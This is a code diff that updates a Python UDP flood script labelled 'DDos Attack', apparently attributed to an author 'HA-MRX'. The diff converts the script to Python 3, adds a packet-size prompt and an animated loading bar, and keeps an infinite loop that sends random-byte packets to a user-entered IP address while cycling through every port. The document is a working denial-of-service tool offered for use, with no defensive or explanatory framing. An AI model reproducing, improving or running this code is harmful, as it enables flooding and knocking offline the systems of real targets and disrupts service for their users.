@@ -14,38 +14,49 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
 #############
 
+##GREETING##
 os.system("clear")
 os.system("figlet DDos Attack")
-print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+print ('''
+Author   : HA-MRX
+You Tube : https://www.youtube.com/c/HA-MRX
+github   : https://github.com/Ha3MrX
+Facebook : https://www.facebook.com/muhamad.jabar222
+''')
+##GREETING##
 
+##INPUT AND CREATE RANDOM BYTES##
+ip = input("IP Target : ")
+port = int(input("Port       : "))
+strenght = int(input("Select power(Default: 1490): "))
+if(strenght != ''):
+	bytes = random._urandom(strenght)
+else:
+	bytes = random._urandom(1490)
 os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
+##INPUT AND CREATE RANDOM BYTES##
+
+##LOADING BAR##
+statbar = 0
+allbar = 50
+while(statbar < 51):
+	os.system("figlet Attack Starting")
+	print ("[" + "="*statbar + ">" + " "*allbar + "]" + str(statbar*2) + "%")
+	statbar += 1
+	allbar -= 1
+	time.sleep(0.07)
+	os.system("clear")
+##LOADING BAR##
+
+##ATTACK##
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     sent += 1
+     port += 1
+     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
      if port == 65534:
        port = 1
-
+##ATTACK##
